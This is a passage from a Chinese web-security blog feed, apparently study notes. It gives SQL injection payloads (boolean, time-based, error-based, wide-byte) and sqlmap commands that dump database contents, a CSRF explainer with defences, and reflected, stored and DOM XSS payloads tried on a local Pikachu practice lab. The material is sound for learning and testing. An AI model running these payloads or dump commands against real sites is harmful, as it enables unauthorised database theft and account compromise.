（返回false页面）<br>存在布尔型盲注<br>2、查数据库长度<br><code>id=1’ and (length(database()))&gt;7%23</code>返回ture页面说明长度大于7<br><code>id=1’ and (length(database()))&gt;20%23</code>返回false页面说明长度小于20<br>利用二分法最终确定数据库长度<br>如果id=1’ and (length(database()))=12%23 返回ture说明数据库长度为12<br>3、查数据库<br><code>?id=1’and ascii(substr(database(),2,1))&gt;114%23</code>（对查询的数据取第一位判断）<br>substr(a,b,c)是截取字符函数。a=截取对象 b=截取的位数 c=截取的个数<br>substr(database(),1,1)是取出数据库的第一位的值。<br>4、查表<br><code>?id=1’ and (ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1)))&gt;130%23</code>（利用二分法，ascii为ascii码，例如97=‘a’）<br>7、查列：<br><code>?id=1’ and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=‘表名’ limit 0,1),1,1)))&gt;0%23</code> (如果报错可以加limit 0,1)<br>8、查字段<br><code>?id=1’ and length((select username from 数据库.表名 limit 0,1))&gt;0%23</code></p><p>###延时型<br>是由返回响应的时间判断的。利用此函数sleep（）与if()<br>判断：<br><code>?id=1’ and sleep(5)%23</code><br>响应时间5秒存在延时注入<br>查数据库<br><code>?id=1’and if((ascii(substr(database(),1,1))&gt;114) ,sleep(5),0)%23</code><br>其他操作语法与布尔型一样。</p><h3 id="报错型注入"><a href="#报错型注入" class="headerlink" title="报错型注入"></a>报错型注入</h3><p>基于报错的盲注是通过输入特定语句使页面报错，网页中则会输出相关错误信息，从而是我们得到想要的基本信息——数据库名、版本、用户名等</p><p>1.直接使用报错：<br><code>&#39; union select 1,count(*),concat(&#39;/&#39;,(select database()),&#39;/&#39;,floor(rand(0)*2))a from information_schema.columns group by a--+</code></p><p>这里格式貌似几乎固定，相当于这样输就会出错的bug，count()用来返回有多少条数据这里固定写法，中间select后面是我们要获得的信息，<br>floor(rand(0)*2)也是固定写法，floor用来取不大于括号里的最大整数，比如1.5取1，后面的a和最后的a只要是相等的字符就可以，注意返回值不能超过一行，如果多行数据加limit<br>2.利用xpath函数-extractvalue报错<br>payload：<br><code>&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</code></p><p>这也是一种类似bug的固定写法，extractvalue，concat里面第一个必须是0x7e，后面是要查的内容，concat里面可以放很多参数（参见目录），所以可以多查很多数据，如<br><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e,user()))--+</code><br>3.利用xpath函数—updatexml报错：<br>payload:<br><code>&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</code></p><p>与extractvalue同理，这里不再赘述</p><p>###宽字节注入<br>测试<br>?id=1’ and 1=2%23 没反应<br>?id=1’ %df’ and 1=2%23 页面返回假。说明存在宽字节注入<br>后面与前面语法一样。不过都得?id=1’ %df’ 有%df进行注入</p><p>##sqlmap使用</p><h3 id="get方式"><a href="#get方式" class="headerlink" title="get方式"></a>get方式</h3><p>查所有数据库<br><code>Sqlmap -u “url” --dbs</code><br>当前数据库<br><code>Sqlmap -u “url” --current-db</code><br>表<br><code>Sqlmap -u “url” -D 数据库 --tables</code><br>列<br><code>Sqlmap -u “url” -D 数据库 -T 表名 --columns</code><br>字段<br><code>Sqlmap -u “url” -D 数据库 -T 表名 -C 列名1，列名2 --dump</code></p><h3 id="post方式"><a href="#post方式" class="headerlink" title="post方式"></a>post方式</h3><p>1.先用burp抓包，如下</p><p><img src="http://q7bvs3hjk.bkt.clouddn.com/static/images/blog/sql1.png"></p><p>将数据包copy to file<br>保存到”C:\Users\Administrator\Desktop\1.txt”<br>2.python sqlmap.py -r “请求包的路径” -p “注入点”<br>查所有数据库<br><code>Sqlmap -r “c://windows/web/1.txt” -p id --dbs (-r为保存的txt文件路径，-p为存在注入的参数，这里是id)</code><br>当前数据库<br><code>Sqlmap -r “c://windows/web/1.txt” -p id --current-db</code><br>查所有表<br><code>Sqlmap -r “c://windows/web/1.txt” -p id -D 数据库 --tables</code><br>列<br><code>Sqlmap -r “c://windows/web/1.txt” -p id -D 数据库 -T 表名 --columns</code><br>字段<br><code>Sqlmap -r “c://windows/web/1.txt” -p id -D 数据库 -T 表名 -C 列名1，列名2 --dump</code></p><p>第二种方法<br>如post id=1存在注入<br>sqlmap -u“url”–data=“id=1”</p><p>第三种方法<br>在表单中，例如登陆页面，如果不知道那个参数存在注入<br>sqlmap.py -u “url” –forms<br>然后一直点y即可。</p><h3 id="http头部注入"><a href="#http头部注入" class="headerlink" title="http头部注入"></a>http头部注入</h3><p>referrer头<br>sqlmap -u “url” –dbs –level 3<br>(可能要跑很久</p><p>host头<br>sqlmap -u “url” –dbs –level 5</p><p>user-agent<br>sqlmap -u “url” –user-agent –dbs –level 3</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>sqlmap -u “url?id=1%df’”</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img width=&quot;700px&quot; height=&quot;400px&quot; src=&quot;http://q7bvs3hjk.bkt.clouddn.com/static/images/end.jpg&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="知识总结" scheme="http://bleaner.club/categories/%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="web安全" scheme="http://bleaner.club/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CSRF跨站请求伪造</title>
    <link href="http://bleaner.club/2019/01/06/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    <id>http://bleaner.club/2019/01/06/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</id>
    <published>2019-01-05T16:00:00.000Z</published>
    <updated>2020-03-17T12:06:38.503Z</updated>
    
    <content type="html"><![CDATA[</p><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><p>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。<br>举个栗子：<br>    场景需求：<br>    小黑想要修改大白在购物网站tianxie<a href="http://www.xx.com上填写的会员地址。" target="_blank" rel="noopener">www.xx.com上填写的会员地址。</a><br>    先看下大白是如何修改自己的密码的：<br>    登录—修改会员信息，提交请求—修改成功。<br>    所以小黑想要修改大白的信息，他需要拥有：<br>    1，登录权限 2，修改个人信息的请求。<br>    但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？<br>    于是他自己跑到<a href="http://www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：" target="_blank" rel="noopener">www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：</a><br>    【<a href="http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】" target="_blank" rel="noopener">http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】</a><br>    于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。<br>    为啥小黑的操作能够实现呢。有如下几个关键点：<br>    1.<a href="http://www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造" target="_blank" rel="noopener">www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造</a>;<br>    —因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。<br>    2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;<br>    —如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。<br>    —因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。<br>    当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。</p><h2 id="2-CSRF和XSS的区别"><a href="#2-CSRF和XSS的区别" class="headerlink" title="2.CSRF和XSS的区别"></a>2.CSRF和XSS的区别</h2><p>CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。<br>    因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：<br>    –对敏感信息的操作增加安全的token；<br>    –对敏感信息的操作增加安全的验证码；<br>    –对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img width=&quot;700px&quot; height=&quot;400px&quot; src=&quot;http://q7bvs3hjk.bkt.clouddn.com/static/images/jztm.jpg&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="知识总结" scheme="http://bleaner.club/categories/%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="web安全" scheme="http://bleaner.club/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>xss跨站脚本攻击</title>
    <link href="http://bleaner.club/2019/01/06/xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
    <id>http://bleaner.club/2019/01/06/xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</id>
    <published>2019-01-05T16:00:00.000Z</published>
    <updated>2020-03-17T10:10:08.006Z</updated>
    
    <content type="html"><![CDATA[</p><h2 id="xss跨站脚本攻击"><a href="#xss跨站脚本攻击" class="headerlink" title="xss跨站脚本攻击"></a>xss跨站脚本攻击</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h3><p>跨站脚本（cross site script）为了避免与样式css混淆，所以简称为XSS。<br>XSS是一种经常出现在web应用中的计算机安全漏洞，也是web中最主流的攻击方式。那么什么是XSS呢？<br>XSS是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。<br>从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。<br>XSS攻击的危害包括：<br>1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号<br>2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力<br>3、盗窃企业重要的具有商业价值的资料<br>4、非法转账<br>5、强制发送电子邮件<br>6、网站挂马<br>7、控制受害者机器向其它网站发起攻击</p><hr><h3 id="2-原因解析"><a href="#2-原因解析" class="headerlink" title="2.原因解析"></a>2.原因解析</h3><p><strong>主要原因</strong>：过于信任客户端提交的数据！<br><strong>解决办法</strong>：不信任任何客户端提交的数据，只要是客户端提交的数据就应该先进行相应的过滤处理然后方可进行下一步的操作。<br><strong>进一步分析细节：</strong>　　<br>客户端提交的数据本来就是应用所需要的，但是恶意攻击者利用网站对客户端提交数据的信任，在数据中插入一些符号以及javascript代码，那么这些数据将会成为应用代码中的一部分了。那么攻击者就可以肆无忌惮地展开攻击啦。　　<br>因此我们绝不可以信任任何客户端提交的数据！！！</p><hr><h3 id="3-xss分类"><a href="#3-xss分类" class="headerlink" title="3.xss分类"></a>3.xss分类</h3><p>一般XSS可以分为如下几种常见类型：<br>1.反射性XSS: 经过后端，不经过数据库<br>2.存储型XSS:  经过后端，经过数据库<br>3.DOM型XSS: 不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。</p><h4 id="3-1反射型xss"><a href="#3-1反射型xss" class="headerlink" title="3.1反射型xss:"></a>3.1反射型xss:</h4><p>　又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。</p><h5 id="3-1-1get请求下的xss"><a href="#3-1-1get请求下的xss" class="headerlink" title="3.1.1get请求下的xss"></a>3.1.1get请求下的xss</h5><p>1.测试输入特殊字符<br><img src="http://q7bvs3hjk.bkt.clouddn.com/static/images/blog/xss1.png"><br>2.查看网页源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;p class=&apos;notice&apos;&gt;who is 1111&quot;&quot;&lt;&gt;&apos;&apos;(),idon&apos;t care!&lt;/p&gt;            &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>3.写payload<br>猜测是该网站是直接将输入的内容显示到who is后边，所以可以直接写javascript脚本<br>比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>提交时发现了一点问题<br><img src="http://q7bvs3hjk.bkt.clouddn.com/static/images/blog/xss2.png"><br>即已经做了防xss的措施，只不过是在前端完成的，简单修改一下maxlength的值就好啦~<br>输入后浏览器弹出xss对话框，达成预期目标<br><img src="http://q7bvs3hjk.bkt.clouddn.com/static/images/blog/xss3.png"><br><a href="http://127.0.0.1:801/pikachu-master/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E&amp;submit=submit" target="_blank" rel="noopener">http://127.0.0.1:801/pikachu-master/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E&amp;submit=submit</a><br>接收者接收消息显示的时候将会弹出警告窗口</p><h5 id="3-1-2post请求的xss"><a href="#3-1-2post请求的xss" class="headerlink" title="3.1.2post请求的xss"></a>3.1.2post请求的xss</h5><p>输入内容通过post表单提交<br>burp抓包分析<br><img src="http://q7bvs3hjk.bkt.clouddn.com/static/images/blog/xss4.png"><br>URL中没有要提交的信息，所以不能直接通过发送链接攻击。</p><hr><p><strong>反射型 XSS 的数据流向是：浏览器 -&gt; 后端 -&gt; 浏览器。</strong></p><h3 id="3-2存储型xss"><a href="#3-2存储型xss" class="headerlink" title="3.2存储型xss"></a>3.2存储型xss</h3><p>后台源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$link=connect();</span><br><span class="line">$html=&apos;&apos;;</span><br><span class="line">if(array_key_exists(&quot;message&quot;,$_POST) &amp;&amp; $_POST[&apos;message&apos;]!=null)&#123;</span><br><span class="line">    $message=escape($link, $_POST[&apos;message&apos;]);</span><br><span class="line">    $query=&quot;insert into message(content,time) values(&apos;$message&apos;,now())&quot;;</span><br><span class="line">    $result=execute($link, $query);</span><br><span class="line">    if(mysqli_affected_rows($link)!=1)&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;数据库出现异常，提交失败！&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>用户输入的内容还是没有过滤，但是不直接显示在页面中，而是插入到了数据库。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo $html;</span><br><span class="line">$query=&quot;select * from message&quot;;</span><br><span class="line">$result=execute($link, $query);</span><br><span class="line">while($data=mysqli_fetch_assoc($result))&#123;</span><br><span class="line">echo &quot;&lt;p class=&apos;con&apos;&gt;&#123;$data[&apos;content&apos;]&#125;&lt;/p&gt;&lt;a href=&apos;xss_stored.php?id=&#123;$data[&apos;id&apos;]&#125;&apos;&gt;删除&lt;/a&gt;&quot;;</span><br><span class="line"> &#125;</span><br><span class="line">echo $html;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>  再由php代码输出到前端</p><hr><p>  存储型xss，又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开浏览器,脚本执行。持久的XSS相比非持久性XSS攻击危害性更大,因为每当用户打开页面，查看内容时脚本将自动执行。</p><hr><p>存储型 XSS 的数据流向是：浏览器 -&gt; 后端 -&gt; 数据库 -&gt; 后端 -&gt; 浏览器。</p><h3 id="3-3-DOM型xss"><a href="#3-3-DOM型xss" class="headerlink" title="3.3 DOM型xss"></a>3.3 DOM型xss</h3><p> 部分代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> &lt;div class=&quot;page-content&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div id=&quot;xssd_main&quot;&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            function domxss()&#123;</span><br><span class="line">                var str = document.getElementById(&quot;text&quot;).value;</span><br><span class="line">                document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&apos;&quot;+str+&quot;&apos;&gt;what do you see?&lt;/a&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            //试试：&apos;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&apos;xss&apos;)&quot;&gt;</span><br><span class="line">            //试试：&apos; onclick=&quot;alert(&apos;xss&apos;)&quot;&gt;,闭合掉就行</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">        &lt;!--&lt;a href=&quot;&quot; onclick=(&apos;xss&apos;)&gt;--&gt;</span><br><span class="line">        &lt;input id=&quot;text&quot; name=&quot;text&quot; type=&quot;text&quot;  value=&quot;&quot; /&gt;</span><br><span class="line">        &lt;input id=&quot;button&quot; type=&quot;button&quot; value=&quot;click me!&quot; onclick=&quot;domxss()&quot; /&gt;</span><br><span class="line">        &lt;div id=&quot;dom&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;&lt;!-- /.page-content --&gt;</span><br></pre></td></tr></table></figure></p><p>直接利用dom方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var str = document.getElementById(&quot;text&quot;).value;</span><br><span class="line">document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&apos;&quot;+str+&quot;&apos;&gt;what do you see?&lt;/a&gt;&quot;;</span><br></pre></td></tr></table></figure></p><p>创建JS把前端输入直接输出到前端。<br>即数据流向是从URL-&gt;浏览器。</p><p><strong>payload</strong><br>‘ onclick=”alert(‘xss’)”&gt;把a标签的href属性闭合掉就行</p><hr><h3 id="4-xss攻击实例-amp-利用"><a href="#4-xss攻击实例-amp-利用" class="headerlink" title="4 xss攻击实例&amp;利用"></a>4 xss攻击实例&amp;利用</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img width=&quot;700px&quot; height=&quot;400px&quot; src=&quot;http://q7bvs3hjk.bkt.clouddn.com/static/images/cmg.jpg&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="知识总结" scheme="http://bleaner.club/categories/%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="web安全" scheme="http://bleaner.club/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
